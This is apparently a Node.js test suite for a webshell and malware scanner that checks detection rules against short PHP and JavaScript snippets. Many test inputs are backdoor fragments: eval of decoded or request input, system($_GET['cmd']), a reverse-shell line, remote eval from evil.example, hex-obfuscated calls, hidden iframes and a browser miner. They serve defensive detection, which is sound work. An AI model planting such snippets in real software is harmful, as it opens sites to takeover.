import { test } from "node:test";
import assert from "node:assert/strict";
import { scanBuffer } from "../src/scanner.js";
import { kindForPath, rulesForKind, RULES } from "../src/rules.js";

const idsFor = (p, content) => scanBuffer(p, Buffer.from(content)).map((f) => f.id);

test("kindForPath maps extensions to coarse kinds", () => {
  assert.equal(kindForPath("a.php"), "php");
  assert.equal(kindForPath("a.phtml"), "php");
  assert.equal(kindForPath("a.PHP5"), "php");
  assert.equal(kindForPath("b.js"), "js");
  assert.equal(kindForPath("c.html"), "html");
  assert.equal(kindForPath("d.png"), "other");
  assert.equal(kindForPath("noext"), "other");
});

test("catches the decode-then-run obfuscation", () => {
  assert.ok(idsFor("x.php", "<?php eval(base64_decode($payload));").includes("php.eval_decode"));
  assert.ok(idsFor("x.php", "<?php eval( gzinflate( $x ));").includes("php.eval_decode"));
});

test("catches eval of raw request input", () => {
  assert.ok(idsFor("x.php", "<?php eval($_POST['c']);").includes("php.eval_user_input"));
  assert.ok(idsFor("x.php", "<?php assert(stripslashes($_REQUEST['a']));").includes("php.eval_user_input"));
});

test("catches the preg_replace /e code modifier", () => {
  assert.ok(idsFor("x.php", "<?php preg_replace('/(.*)/e', $_POST['x'], $s);").includes("php.preg_replace_e"));
});

test("catches shell commands built from request input", () => {
  assert.ok(idsFor("x.php", "<?php system($_GET['cmd']);").includes("php.exec_user_input"));
  assert.ok(idsFor("x.php", "<?php passthru($_REQUEST['c']);").includes("php.exec_user_input"));
});

test("catches the request-picks-the-function backdoor", () => {
  assert.ok(idsFor("x.php", "<?php $_GET['f']($_POST['a']);").includes("php.variable_function_input"));
});

test("catches create_function and remote-run backdoors", () => {
  assert.ok(idsFor("x.php", "<?php $f = create_function('$a', $body);").includes("php.create_function"));
  assert.ok(idsFor("x.php", "<?php eval(file_get_contents('http://evil.example/x'));").includes("php.remote_include_eval"));
});

test("catches function-name-from-input backdoors and extract of input", () => {
  assert.ok(idsFor("x.php", "<?php call_user_func($_GET['fn'], $arg);").includes("php.call_user_func_input"));
  assert.ok(idsFor("x.php", "<?php extract($_REQUEST);").includes("php.extract_input"));
});

test("reverse shell rule needs a real shell, not a doc mention of fsockopen", () => {
  assert.ok(idsFor("x.php", '<?php $s = fsockopen($ip, $port); exec("/bin/sh -i <&3 >&3 2>&3");').includes("php.reverse_shell"));
  assert.ok(!idsFor("x.php", "<?php /* built on fsockopen() under the hood */ $x = 1;").includes("php.reverse_shell"));
});

test("does not false-positive on markdown backticks in PHP doc comments", () => {
  // WordPress core is full of these. An earlier rule wrongly flagged them.
  const doc =
    "<?php\n/**\n * Values come from `$_POST` and `$_GET` and are validated.\n" +
    " * Delivered via the `Sockets` class or `fsockopen()`.\n */\nfunction wp_thing() { return true; }\n";
  assert.deepEqual(idsFor("core.php", doc), []);
});

test("recognizes known webshell family fingerprints", () => {
  assert.ok(idsFor("x.php", "// c99shell v1").includes("shell.c99"));
  assert.ok(idsFor("x.php", "$k = 'r57shell';").includes("shell.r57"));
  assert.ok(idsFor("x.php", "$default = 'FilesMan';").includes("shell.filesman"));
});

test("catches browser cryptominers and injected iframes", () => {
  assert.ok(idsFor("a.js", "new CoinHive.Anonymous('key')").includes("miner.browser"));
  assert.ok(idsFor("a.js", "document.write(unescape('%3Cscript'))").includes("js.document_write_unescape"));
  assert.ok(idsFor("p.html", '<iframe src="http://x" width="0" height="0"></iframe>').includes("js.hidden_iframe"));
});

test("the WSO rule matches WSO's own names, not the letters w-s-o inside another word", () => {
  assert.ok(idsFor("x.php", "<?php define('WSO_VERSION', '2.5');").includes("shell.wso"));
  assert.ok(idsFor("x.php", "<?php function wsoLogin() { die(); } wsoLogin();").includes("shell.wso"));
  assert.ok(idsFor("x.php", "<?php echo '<title>WSO 4.2.5</title>';").includes("shell.wso"));
  // Real WordPress core lines that used to be called a webshell.
  assert.deepEqual(idsFor("wp-admin/includes/continents-cities.php", "<?php __( 'Dawson', 'continents-cities' );"), []);
  assert.deepEqual(idsFor("wp-includes/load.php", "<?php // that should be protected against WSODs and the plugin is paused."), []);
  assert.deepEqual(idsFor("Compat.php", "<?php if (self::useNewSodiumAPI()) { return 1; }"), []);
  assert.deepEqual(idsFor("ca-bundle.crt", "utI3gzhTODY7z2zp+WsO0PsE6E9312UBeIYMej4hYvF/Y3EMyZ9E26gnonW+boE+18DrG5gPcFw0"), []);
});

test("the hex rule flags hidden function names, not binary constants", () => {
  // "system" and "eval" spelled in hex, lower and upper case.
  assert.ok(idsFor("x.php", '<?php $f = "\\x73\\x79\\x73\\x74\\x65\\x6d"; $f($_GET["c"]);').includes("php.hex_obfuscation"));
  assert.ok(idsFor("x.php", '<?php "\\x45\\x56\\x41\\x4C"($_POST["p"]);').includes("php.hex_obfuscation"));
  // A hex string literal invoked directly, whatever it spells.
  assert.ok(idsFor("x.php", '<?php "\\x61\\x62\\x63"("x");').includes("php.hex_obfuscation"));
  // $_POST spelled in hex.
  assert.ok(idsFor("x.js", 'var k = "\\x5f\\x50\\x4f\\x53\\x54";').includes("php.hex_obfuscation"));
  // Binary constants from real WordPress core, sodium_compat, and getID3.
  assert.deepEqual(idsFor("compat-utf8.php", '<?php $x = "\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f";'), []);
  assert.deepEqual(idsFor("AEGIS256.php", "<?php define('SODIUM_COMPAT_AEGIS_C0', \"\\x00\\x01\\x01\\x02\\x03\\x05\\x08\\x0d\\x15\\x22\\x37\\x59\\x90\\xe9\\x79\\x62\");"), []);
  assert.deepEqual(idsFor("H.php", '<?php const L = "\\xed\\xd3\\xf5\\x5c\\x1a\\x63\\x12\\x58\\xd6\\x9c\\xf7\\xa2\\xde\\xf9\\xde\\x14\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10";'), []);
});

test("the hidden iframe rule wants a frame that goes somewhere", () => {
  assert.ok(idsFor("p.html", '<iframe src="http://x" width="0" height="0"></iframe>').includes("js.hidden_iframe"));
  assert.ok(idsFor("p.php", "<?php echo '<iframe src=\"//evil.example/l.php\" style=\"visibility:hidden\"></iframe>';").includes("js.hidden_iframe"));
  assert.ok(idsFor("p.js", "document.write('<iframe src=\"http://evil.example/x\" width=1 height=1></iframe>');").includes("js.hidden_iframe"));
  // marginwidth="0" is not width="0".
  assert.deepEqual(idsFor("embed.php", '<?php echo \'<iframe sandbox="allow-scripts" src="%1$s" width="%2$d" height="%3$d" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>\';'), []);
  // A hidden scratch frame with no destination, as upload libraries create.
  assert.deepEqual(idsFor("moxie.js", "temp.innerHTML = '<iframe id=\"' + uid + '_iframe\" src=\"javascript:&quot;&quot;\" style=\"display:none\"></iframe>';"), []);
  // The Google Tag Manager noscript snippet that sits in most theme headers.
  assert.deepEqual(idsFor("header.php", '<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-XXXX" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>'), []);
});

test("catches the EICAR test string in any file kind", () => {
  const ids = idsFor("note.txt", "harmless X5O EICAR-STANDARD-ANTIVIRUS-TEST-FILE marker");
  assert.ok(ids.includes("test.eicar"));
});

test("leaves clean, ordinary code alone", () => {
  assert.deepEqual(idsFor("x.php", "<?php echo 'Hello, world'; function add($a,$b){return $a+$b;}"), []);
  assert.deepEqual(idsFor("a.js", "export function sum(list){ return list.reduce((a,b)=>a+b,0); }"), []);
  assert.deepEqual(idsFor("s.css", "body{margin:0}"), []);
});

test("every rule declares the required fields", () => {
  const severities = new Set(["critical", "high", "medium", "low"]);
  const ids = new Set();
  for (const rule of RULES) {
    assert.ok(rule.id && !ids.has(rule.id), `unique id: ${rule.id}`);
    ids.add(rule.id);
    assert.ok(severities.has(rule.severity), `valid severity: ${rule.id}`);
    assert.ok(rule.pattern instanceof RegExp, `pattern is a regexp: ${rule.id}`);
    assert.ok(Array.isArray(rule.kinds) && rule.kinds.length, `kinds set: ${rule.id}`);
    assert.ok(typeof rule.description === "string" && rule.description.length > 10, `description: ${rule.id}`);
  }
});

test("rulesForKind honors the ignore set", () => {
  const all = rulesForKind("php").map((r) => r.id);
  assert.ok(all.includes("php.eval_decode"));
  const filtered = rulesForKind("php", new Set(["php.eval_decode"])).map((r) => r.id);
  assert.ok(!filtered.includes("php.eval_decode"));
});
